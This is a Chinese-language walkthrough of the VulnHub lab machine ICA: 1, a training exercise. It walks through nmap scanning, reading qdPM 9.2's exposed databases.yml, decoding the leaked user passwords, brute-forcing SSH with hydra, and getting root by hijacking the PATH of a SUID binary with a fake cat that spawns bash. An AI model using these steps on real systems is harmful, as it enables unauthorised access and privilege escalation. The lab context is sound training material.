## 简介

靶机下载地址：[ICA： 1 ~ VulnHub](https://www.vulnhub.com/entry/ica-1,748/)

靶机简介：根据我们情报网的信息，ICA正在进行一个秘密项目。我们需要找出该项目是什么。一旦你得到访问信息，就把它们发给我们。我们稍后会放置一个后门来访问该系统。你只需专注于该项目是什么。你可能要通过几层安全保障。中情局完全相信你会成功完成这项任务。好运，特工!

难度： 简单

## 探测IP，扫描端口

    
    
    netdiscover -r 192.168.81.0/24
    

![1652318530_627c61428d141e9e40fab.png!small?1652318531161](https://image.3001.net/images/20220512/1652318530_627c61428d141e9e40fab.png!small?1652318531161)

    
    
    nmap -A 192.168.81.150
    

![1652343141_627cc1657248de5b37a99.png!small?1652343142058](https://image.3001.net/images/20220512/1652343141_627cc1657248de5b37a99.png!small?1652343142058)

开启了80、22、3306，先来查看一下网页

## 探测80端口信息

### 查看页面

为一个登录页面，看到qdPM9.2。

![1652346260_627ccd94810d2ee264ca2.png!small?1652346261093](https://image.3001.net/images/20220512/1652346260_627ccd94810d2ee264ca2.png!small?1652346261093)

不了解该软件系统，百度搜索 <https://codingdict.com/os/software/63511>得知这是一个开源项目管理系统。

### 探测该软件系统漏洞

    
    
    searchsploit qdPM  9.2         

发现有该版本存在漏洞：密码暴露

  

![1652346690_627ccf42aa44a90d2f62f.png!small?1652346691292](https://image.3001.net/images/20220512/1652346690_627ccf42aa44a90d2f62f.png!small?1652346691292)

查看漏洞利用

    
    
    cat /usr/share/exploitdb/exploits/php/webapps/50176.txt 

翻译一下：数据库的密码和连接字符串存储在一个 yml
文件中。要访问该yml文件，你可以到http://<website>/core/config/databases.yml文件并下载。

![1652347058_627cd0b2a03aafabbabc1.png!small?1652347059201](https://image.3001.net/images/20220512/1652347058_627cd0b2a03aafabbabc1.png!small?1652347059201)

访问页面获取到了数据库账号密码（因为是纯字母，所以不需要url解码）

    
    
    qdpmadmin：UcVQCMQk2STVeS6J

![1652347192_627cd138dd6ff362827e5.png!small?1652347193439](https://image.3001.net/images/20220512/1652347192_627cd138dd6ff362827e5.png!small?1652347193439)

## 登录数据库

    
    
    mysql -h 192.168.81.150 -u qdpmadmin -p   

探索有用的信息

![1652348267_627cd56b00bfcf3299677.png!small?1652348267528](https://image.3001.net/images/20220512/1652348267_627cd56b00bfcf3299677.png!small?1652348267528)

在qdpm的配置文件中找到了管理员的账号和密码

![1652349477_627cda2517da64eca69ab.png!small?1652349477719](https://image.3001.net/images/20220512/1652349477_627cda2517da64eca69ab.png!small?1652349477719)

但是无法破解密码。

终于在staff数据库下的user表和login表发现信息。

![1652348234_627cd54a793cdc2388bed.png!small?1652348235101](https://image.3001.net/images/20220512/1652348234_627cd54a793cdc2388bed.png!small?1652348235101)

其中login的password有对应的user_id

我们整理一下，并用base64解码

    
    
    Smith ：WDdNUWtQM1cyOWZld0hkQw     //解码为X7MQkP3W29fewHdC
    Lucas： c3VSSkFkR3dMcDhkeTNyRg   //解码为suRJAdGwLp8dy3rF
    Travis：REpjZVZ5OThXMjhZN3dMZw   //解码为DJceVy98W28Y7wLg
    Dexter：N1p3VjRxdGc0MmNtVVhHWA   //解码为7ZwV4qtg42cmUXGX
    Meyer：Y3FObkJXQ0J5UzJEdUpTeQ   //解码为cqNnBWCByS2DuJSy

爆破一下密码

    
    
    hydra -L user.txt -P passwd.txt ssh://192.168.81.150 -t 4 -vV
    

由于大写得不到密码，我尝试修改为了小写，爆破成功

![1652495896_627f1618d4a67b2f51add.png!small?1652495897880](https://image.3001.net/images/20220514/1652495896_627f1618d4a67b2f51add.png!small?1652495897880)

## 登录ssh，搜集信息

### 登录travis

    
    
    ssh [travis@192.168.81.150](mailto:travis@192.168.81.150)//登录travis
    

![1652496129_627f1701a6ee8df475f9c.png!small?1652496130770](https://image.3001.net/images/20220514/1652496129_627f1701a6ee8df475f9c.png!small?1652496130770)

得到一条flag

查看一下有suid的指令和sudo的权限

    
    
    /usr/bin$ find / -perm -u=s -type f 2>/dev/null

![1652498496_627f20402d0ed1f037d71.png!small?1652498497232](https://image.3001.net/images/20220514/1652498496_627f20402d0ed1f037d71.png!small?1652498497232)

查看一下sudo权限

    
    
    sudo -l

![1652498555_627f207b1f7af1e6041d7.png!small?1652498556122](https://image.3001.net/images/20220514/1652498555_627f207b1f7af1e6041d7.png!small?1652498556122)

都没有可利用的点。

### 切换用户dexter

ssh dexter@192.168.81.150 //登录Dexter

![1652496413_627f181d5c7815f6159a0.png!small?1652496414433](https://image.3001.net/images/20220514/1652496413_627f181d5c7815f6159a0.png!small?1652496414433)

得到一条提示：翻译一下---->在我看来，在访问系统时有一个弱点。  
据我所知，可执行文件的内容是可以部分查看的。  
我需要弄清楚是否存在漏洞。 //没搞懂

同样查看一下suid的命令

![1652498866_627f21b217fb8db9dedfd.png!small?1652498867143](https://image.3001.net/images/20220514/1652498866_627f21b217fb8db9dedfd.png!small?1652498867143)

发现get_access比较可疑，经查看是一个有s位的可执行文件，验证了刚才note.txt里的话

![1652498918_627f21e60880c43616bc1.png!small?1652498919030](https://image.3001.net/images/20220514/1652498918_627f21e60880c43616bc1.png!small?1652498919030)

note提示说可执行文件的内容是可以部分查看的，我们查看一下

    
    
    cat get_acces  

![1652499220_627f231462900ee07eff0.png!small?1652499221453](https://image.3001.net/images/20220514/1652499220_627f231462900ee07eff0.png!small?1652499221453)

发现全是乱码，我们用string查看一下，发现有一个cat查看了root的系统信息

![1652500120_627f2698ef15e839b2f83.png!small?1652500122020](https://image.3001.net/images/20220514/1652500120_627f2698ef15e839b2f83.png!small?1652500122020)

这里的漏洞是，由于程序没有使用绝对路径进行调用cat，我们可以制作一个恶意的cat文件，运行get_access市调用它。

## 提权

    
    
    echo '/bin/bash' > /tmp/cat
    chmod +x /tmp/cat
    export PATH=/tmp:$PATH
    ./get_access

![1652501460_627f2bd40eaf4e6bd2beb.png!small?1652501461174](https://image.3001.net/images/20220514/1652501460_627f2bd40eaf4e6bd2beb.png!small?1652501461174)

这样一来，系统会首先调用path靠前的命令，就会调用到我们制作的”恶意cat“

现在我们切换到了root用户（因为市以root权限执行的/bin/bash，所以就会直接切换到root的shell）

![1652501766_627f2d06e358e3eff36e2.png!small?1652501768006](https://image.3001.net/images/20220514/1652501766_627f2d06e358e3eff36e2.png!small?1652501768006)

由于我们把cat文件的执行命令路径替换到了，所以用more来查看第二天flag

![1652501818_627f2d3a4bb8a98b8e9a0.png!small?1652501819337](https://image.3001.net/images/20220514/1652501818_627f2d3a4bb8a98b8e9a0.png!small?1652501819337)

完成：获得了两条flag

### 补充

关于/bin/bash：这是一个开启shell的命令，以谁的权限执行就会登陆到谁的shell。

